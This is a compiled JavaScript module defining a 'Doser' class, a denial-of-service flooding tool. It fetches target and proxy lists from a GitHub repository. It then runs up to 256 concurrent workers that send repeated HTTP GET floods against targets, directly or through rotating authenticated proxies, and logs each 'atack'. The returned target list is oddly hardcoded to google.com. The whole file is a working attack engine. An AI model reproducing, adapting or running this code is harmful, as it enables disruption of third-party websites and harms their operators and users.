"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (_) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.Doser = void 0;
var axios_https_proxy_fix_1 = __importDefault(require("axios-https-proxy-fix"));
var events_1 = require("events");
var Doser = /** @class */ (function () {
    function Doser(onlyProxy, workers) {
        var _this = this;
        this.hosts = [];
        this.ATACKS_PER_TARGET = 64;
        this.onlyProxy = onlyProxy;
        this.working = false;
        this.workers = workers;
        this.eventSource = new events_1.EventEmitter();
        this.workerActive = new Array(256);
        this.workerActive.fill(false);
        //Initialize data
        this.updateTargetsAndProxies();
        // Update data repeatedly
        this.loadingDataInterval = setInterval(function () {
            _this.updateTargetsAndProxies();
        }, 300000);
    }
    Doser.prototype.updateTargetsAndProxies = function () {
        var _this = this;
        this.getSitesAndProxies()
            .then(function (data) {
            _this.loadedTargetsAndProxies = data;
        })
            .catch(function () { return console.log('Unable to update data'); });
    };
    Doser.prototype.forceProxy = function (newVal) {
        this.onlyProxy = newVal;
    };
    Doser.prototype.getSitesAndProxies = function () {
        return __awaiter(this, void 0, void 0, function () {
            var sitesResponse, proxyResponse, sites, proxyes, e_1;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        _a.trys.push([0, 3, , 4]);
                        console.log('Loading targets and proxies;');
                        return [4 /*yield*/, axios_https_proxy_fix_1.default.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })];
                    case 1:
                        sitesResponse = _a.sent();
                        return [4 /*yield*/, axios_https_proxy_fix_1.default.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })
                            // https://www.wikipedia.org/
                        ];
                    case 2:
                        proxyResponse = _a.sent();
                        // https://www.wikipedia.org/
                        if (sitesResponse.status === 200 && proxyResponse.status === 200) {
                            sites = sitesResponse.data;
                            proxyes = proxyResponse.data;
                            console.log('Targets and proxies were loaded;');
                            return [2 /*return*/, {
                                    sites: [
                                        {
                                            page: 'https://www.google.com/'
                                        }
                                    ],
                                    proxyes: proxyes
                                }];
                        }
                        return [3 /*break*/, 4];
                    case 3:
                        e_1 = _a.sent();
                        console.log('Error while loading hosts and proxies: ', e_1);
                        return [2 /*return*/, null];
                    case 4: return [2 /*return*/, null];
                }
            });
        });
    };
    Doser.prototype.start = function () {
        var _this = this;
        this.working = true;
        this.setWorkersCount(this.workers);
        var _loop_1 = function (i) {
            var setI = i;
            setImmediate(function () { return void _this.worker.bind(_this)(setI); });
        };
        for (var i = 0; i < 256; i++) {
            _loop_1(i);
        }
    };
    Doser.prototype.setWorkersCount = function (newCount) {
        this.workers = newCount;
        for (var wIndex = 0; wIndex < 256; wIndex++) {
            this.workerActive[wIndex] = (wIndex < newCount);
        }
    };
    Doser.prototype.stop = function () {
        this.working = false;
    };
    Doser.prototype.listen = function (event, callback) {
        this.eventSource.addListener(event, callback);
    };
    Doser.prototype.worker = function (workerIndex) {
        return __awaiter(this, void 0, void 0, function () {
            var target, directRequest, response, e_2, proxy, atackIndex, r, proxyAddressSplit, proxyIP, proxyPort, proxyAuthSplit, proxyUsername, proxyPassword, r, e_3, code;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        if (!this.working) return [3 /*break*/, 16];
                        if (!(!this.workerActive[workerIndex] || this.loadedTargetsAndProxies == null)) return [3 /*break*/, 2];
                        return [4 /*yield*/, new Promise(function (resolve) { return setTimeout(resolve, 1000); })];
                    case 1:
                        _a.sent();
                        return [3 /*break*/, 0];
                    case 2:
                        target = {
                            site: this.loadedTargetsAndProxies.sites[Math.floor(Math.random() * this.loadedTargetsAndProxies.sites.length)],
                            proxy: this.loadedTargetsAndProxies.proxyes
                        };
                        directRequest = false;
                        if (!!this.onlyProxy) return [3 /*break*/, 6];
                        _a.label = 3;
                    case 3:
                        _a.trys.push([3, 5, , 6]);
                        return [4 /*yield*/, axios_https_proxy_fix_1.default.get(target.site.page, { timeout: 10000 })];
                    case 4:
                        response = _a.sent();
                        directRequest = response.status === 200;
                        return [3 /*break*/, 6];
                    case 5:
                        e_2 = _a.sent();
                        this.eventSource.emit('error', { type: 'error', error: e_2 });
                        directRequest = false;
                        return [3 /*break*/, 6];
                    case 6:
                        proxy = null;
                        atackIndex = 0;
                        _a.label = 7;
                    case 7:
                        if (!((atackIndex < this.ATACKS_PER_TARGET) && this.working)) return [3 /*break*/, 15];
                        _a.label = 8;
                    case 8:
                        _a.trys.push([8, 13, , 14]);
                        if (!directRequest) return [3 /*break*/, 10];
                        return [4 /*yield*/, axios_https_proxy_fix_1.default.get(target.site.page, { timeout: 5000, validateStatus: function () { return true; } })];
                    case 9:
                        r = _a.sent();
                        this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: "".concat(target.site.page, " | DIRECT | ").concat(r.status) });
                        return [3 /*break*/, 12];
                    case 10:
                        if (proxy === null) {
                            proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)];
                        }
                        proxyAddressSplit = proxy.ip.split(':');
                        proxyIP = proxyAddressSplit[0];
                        proxyPort = parseInt(proxyAddressSplit[1]);
                        proxyAuthSplit = proxy.auth.split(':');
                        proxyUsername = proxyAuthSplit[0];
                        proxyPassword = proxyAuthSplit[1];
                        return [4 /*yield*/, axios_https_proxy_fix_1.default.get(target.site.page, {
                                timeout: 10000,
                                validateStatus: function () { return true; },
                                proxy: {
                                    host: proxyIP,
                                    port: proxyPort,
                                    auth: {
                                        username: proxyUsername,
                                        password: proxyPassword
                                    }
                                }
                            })];
                    case 11:
                        r = _a.sent();
                        this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: "".concat(target.site.page, " | PROXY | ").concat(r.status, " | ").concat(target.site.page_time, " ms") });
                        if (r.status === 407) {
                            console.log('Proxy requires auth: ', proxy);
                            proxy = null;
                        }
                        _a.label = 12;
                    case 12: return [3 /*break*/, 14];
                    case 13:
                        e_3 = _a.sent();
                        proxy = null;
                        code = e_3.code;
                        if (code === undefined) {
                            console.log('Unknown error: ', e_3);
                            code = 'UNKNOWN';
                        }
                        this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: "".concat(target.site.page, " | ").concat(code) });
                        if (code === 'ECONNABORTED') {
                            return [3 /*break*/, 15];
                        }
                        return [3 /*break*/, 14];
                    case 14:
                        atackIndex++;
                        return [3 /*break*/, 7];
                    case 15: return [3 /*break*/, 0];
                    case 16:
                        console.log('Worker finished its work: ', workerIndex);
                        return [2 /*return*/];
                }
            });
        });
    };
    return Doser;
}());
exports.Doser = Doser;
